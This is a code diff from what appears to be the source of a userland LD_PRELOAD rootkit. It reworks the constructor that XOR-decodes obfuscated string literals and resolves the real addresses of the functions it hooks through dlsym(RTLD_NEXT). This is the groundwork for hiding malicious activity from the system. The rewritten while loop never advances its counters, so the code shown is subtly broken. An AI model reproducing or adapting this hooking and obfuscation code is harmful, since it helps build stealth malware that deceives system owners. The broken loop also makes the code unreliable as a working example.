@@ -32,7 +32,7 @@
 # define xor(...)
 #else
 static void     xor(char *p) {
-    unsigned int i;
+    unsigned int    i;
 
     for(i = 0; i < strlen(p); i++) {
         p[i] ^= XOR_KEY;
@@ -58,30 +58,24 @@ static void     init_hidden_literals(void) {
 }
 
 
-/** re-xorify syscalls table.
+/** retrieve native function pointers of hooked functions
+ * it feeds __non_hooked_symbols table from function names
+ * (stored at the end of __hidden_literals).
+ *
+ * NOTE: If not called, all `REAL_<NAME>` macros will point
+ * to an invalid location.
  */
-static void     init_syscalls_table(void) {
-    int     i;
+static void     init_non_hooked_symbols(void)
+{
+    int     i, j;
+    char    *func_name;
+    char    *dl_error;
 
-    for (i=0; i<NUM_SYSCALLS; i++) {
-        xor(beurk_syscalls_table[i]);
-    }
-}
-
-
-/** initializes the global array beurk_syscalls_list
- * if dlsym fail, and DEBUG_MODE is activating, a error message
- * is print.
-*/
-static void     init_syscalls_list() {
-    int  i;
-    char *syscall;
-    char *dl_error;
-
-    dlerror();
-    for (i = 0; i < NUM_SYSCALLS; i++) {
-        syscall = beurk_syscalls_table[i];
-        beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
+    i = 0;
+    j = NUM_LITERALS - NUM_HOOKS;
+    while (j < NUM_LITERALS) {
+        func_name = __hidden_literals[j];
+        __non_hooked_symbols[i] = dlsym(RTLD_NEXT, func_name);
         if ((dl_error = dlerror()) != NULL)
             DEBUG(D_ERROR, dl_error);
     }
@@ -92,8 +86,7 @@ static void     init_syscalls_list() {
  */
 void        init(void)
 {
-    init_hidden_literals();
-    init_syscalls_table();
-    init_syscalls_list();
     DEBUG(D_INFO, "init() constructor loaded");
+    init_hidden_literals();
+    init_non_hooked_symbols();
 }
